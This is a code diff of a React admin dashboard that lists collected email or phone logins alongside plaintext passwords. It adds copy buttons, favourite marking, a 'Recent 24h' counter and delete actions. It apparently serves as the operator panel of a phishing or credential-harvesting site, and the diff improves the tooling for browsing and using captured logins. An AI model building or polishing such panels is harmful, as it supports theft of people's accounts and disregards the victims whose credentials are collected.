@@ -1,6 +1,6 @@
 "use client";
 
-import { useState, useEffect } from "react";
+import { useEffect, useState } from "react";
 
 export default function AdminPage() {
   const [authenticated, setAuthenticated] = useState(false);
@@ -8,18 +8,36 @@ export default function AdminPage() {
   const [loginEmail, setLoginEmail] = useState("");
   const [loginPassword, setLoginPassword] = useState("");
   const [loginError, setLoginError] = useState("");
-  const [copyStep, setCopyStep] = useState(null);
+  const [loading, setLoading] = useState(false);
 
   useEffect(() => {
     fetch("/api/admin/auth", { credentials: "include" })
       .then((res) => res.json())
-      .then((result) => setAuthenticated(result.authenticated))
+      .then((result) => setAuthenticated(Boolean(result.authenticated)))
       .catch(() => setAuthenticated(false));
   }, []);
+
+  useEffect(() => {
+    if (authenticated) {
+      fetchData();
+    }
+  }, [authenticated]);
+
+  const fetchData = async () => {
+    try {
+      const res = await fetch("/api/admin/data", { credentials: "include" });
+      const result = await res.json();
+      setData(Array.isArray(result) ? result : []);
+    } catch {
+      setData([]);
+    }
+  };
 
   const handleAdminLogin = async (e) => {
     e.preventDefault();
     setLoginError("");
+    setLoading(true);
+
     try {
       const res = await fetch("/api/admin/login", {
         method: "POST",
@@ -27,15 +45,18 @@ export default function AdminPage() {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ email: loginEmail, password: loginPassword }),
       });
+
       const result = await res.json();
       if (result.success) {
         setAuthenticated(true);
-        fetchData();
+        await fetchData();
       } else {
-        setLoginError("Invalid credentials");
+        setLoginError(result.message || "Invalid credentials");
       }
     } catch {
       setLoginError("Login failed. Please try again.");
+    } finally {
+      setLoading(false);
     }
   };
 
@@ -45,46 +66,16 @@ export default function AdminPage() {
     setData([]);
   };
 
-  const fetchData = async () => {
+  const handleCopy = async (text) => {
     try {
-      const res = await fetch("/api/admin/data", { credentials: "include" });
-      const result = await res.json();
-      if (Array.isArray(result)) {
-        setData(result);
-      } else {
-        setData([]);
-      }
-    } catch {
-      setData([]);
-    }
-  };
-
-  const handleCopy = async (email, password) => {
-    setCopyStep("email");
-    try {
-      await navigator.clipboard.writeText(email);
-      setTimeout(() => {
-        setCopyStep("password");
-        navigator.clipboard.writeText(password);
-        setTimeout(() => setCopyStep(null), 500);
-      }, 500);
+      await navigator.clipboard.writeText(text);
     } catch {
       const textArea = document.createElement("textarea");
-      textArea.value = email;
+      textArea.value = text;
       document.body.appendChild(textArea);
       textArea.select();
       document.execCommand("copy");
       document.body.removeChild(textArea);
-      setTimeout(() => {
-        setCopyStep("password");
-        const textArea2 = document.createElement("textarea");
-        textArea2.value = password;
-        document.body.appendChild(textArea2);
-        textArea2.select();
-        document.execCommand("copy");
-        document.body.removeChild(textArea2);
-        setTimeout(() => setCopyStep(null), 500);
-      }, 500);
     }
   };
 
@@ -96,16 +87,43 @@ export default function AdminPage() {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ id }),
       });
-      setData(data.filter((item) => item._id !== id));
+      setData((current) => current.filter((item) => item._id !== id));
     } catch {
-      setData(data.filter((item) => item._id !== id));
+      setData((current) => current.filter((item) => item._id !== id));
     }
   };
 
+  const handleFavoriteToggle = async (id, value) => {
+    try {
+      await fetch("/api/admin/data", {
+        method: "PATCH",
+        credentials: "include",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ id, favorite: !value }),
+      });
+
+      setData((current) =>
+        current.map((item) =>
+          item._id === id ? { ...item, favorite: !value } : item
+        )
+      );
+    } catch (error) {
+      console.error("Favorite toggle failed", error);
+    }
+  };
+
+  const totalCount = data.length;
+  const favoriteCount = data.filter((item) => item.favorite).length;
+  const recentCount = data.filter((item) => {
+    const created = new Date(item.timestamp || item.createdAt || Date.now());
+    const diffHours = (Date.now() - created.getTime()) / (1000 * 60 * 60);
+    return diffHours <= 24;
+  }).length;
+
   if (!authenticated) {
     return (
-      <div className="admin-container" style={{ display: "flex", alignItems: "center", justifyContent: "center", minHeight: "100vh" }}>
-        <div className="login-form-container">
+      <div className="admin-shell login-shell">
+        <div className="login-form-container compact-box">
           <h2>Admin Login</h2>
           <form onSubmit={handleAdminLogin}>
             <input
@@ -122,8 +140,10 @@ export default function AdminPage() {
               onChange={(e) => setLoginPassword(e.target.value)}
               required
             />
-            {loginError && <p style={{ color: "red", marginBottom: "10px" }}>{loginError}</p>}
-            <button type="submit">Login</button>
+            {loginError && <p className="error-message">{loginError}</p>}
+            <button type="submit" disabled={loading}>
+              {loading ? "Logging in..." : "Login"}
+            </button>
           </form>
         </div>
       </div>
@@ -131,48 +151,75 @@ export default function AdminPage() {
   }
 
   return (
-    <div className="admin-container">
-      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
-        <h1>Admin Dashboard</h1>
-        <button className="btn btn-delete" onClick={handleLogout}>Logout</button>
-      </div>
-      {data.length === 0 ? (
-        <p className="empty-message">No data yet.</p>
-      ) : (
-        <table className="admin-table">
-          <thead>
-            <tr>
-              <th>#</th>
-              <th>Email/Phone</th>
-              <th>Password</th>
-              <th>Actions</th>
-            </tr>
-          </thead>
-          <tbody>
+    <div className="admin-shell">
+      <aside className="sidebar-panel">
+        <h3>Overview</h3>
+        <div className="stat-card">
+          <span>Total</span>
+          <strong>{totalCount}</strong>
+        </div>
+        <div className="stat-card">
+          <span>Favorites</span>
+          <strong>{favoriteCount}</strong>
+        </div>
+        <div className="stat-card">
+          <span>Recent 24h</span>
+          <strong>{recentCount}</strong>
+        </div>
+      </aside>
+
+      <main className="content-panel">
+        <div className="topbar">
+          <h1>Admin Dashboard</h1>
+          <button className="btn btn-delete" onClick={handleLogout}>Logout</button>
+        </div>
+
+        {data.length === 0 ? (
+          <div className="empty-state">No entries found yet.</div>
+        ) : (
+          <div className="record-list">
             {data.map((item, index) => (
-              <tr key={item._id}>
-                <td>{index + 1}</td>
-                <td>{item.email}</td>
-                <td>{item.password}</td>
-                <td>
+              <div key={item._id} className={`record-card ${item.favorite ? "favorite" : ""}`}>
+                <div className="record-top">
+                  <span className="record-index">#{index + 1}</span>
                   <button
-                    className="btn btn-copy"
-                    onClick={() => handleCopy(item.email, item.password)}
+                    className={`favorite-btn ${item.favorite ? "active" : ""}`}
+                    onClick={() => handleFavoriteToggle(item._id, item.favorite)}
+                    aria-label="Toggle favorite"
                   >
-                    {copyStep === "email" ? "Copying Email..." : copyStep === "password" ? "Copied Password" : "Copy"}
+                    ★
                   </button>
-                  <button
-                    className="btn btn-delete"
-                    onClick={() => handleDelete(item._id)}
-                  >
+                </div>
+
+                <div className="record-row">
+                  <label>Email / Phone</label>
+                  <div className="value-row">
+                    <span>{item.email}</span>
+                    <button className="mini-btn" onClick={() => handleCopy(item.email)}>Copy</button>
+                  </div>
+                </div>
+
+                <div className="record-row">
+                  <label>Password</label>
+                  <div className="value-row">
+                    <span>{item.password}</span>
+                    <button className="mini-btn" onClick={() => handleCopy(item.password)}>Copy</button>
+                  </div>
+                </div>
+
+                <div className="record-actions">
+                  <span className="timestamp">
+                    {new Date(item.timestamp || item.createdAt || Date.now()).toLocaleString()}
+                  </span>
+                  <button className="btn btn-delete" onClick={() => handleDelete(item._id)}>
                     Delete
                   </button>
-                </td>
-              </tr>
+                </div>
+              </div>
             ))}
-          </tbody>
-        </table>
-      )}
+          </div>
+        )}
+      </main>
     </div>
   );
 }
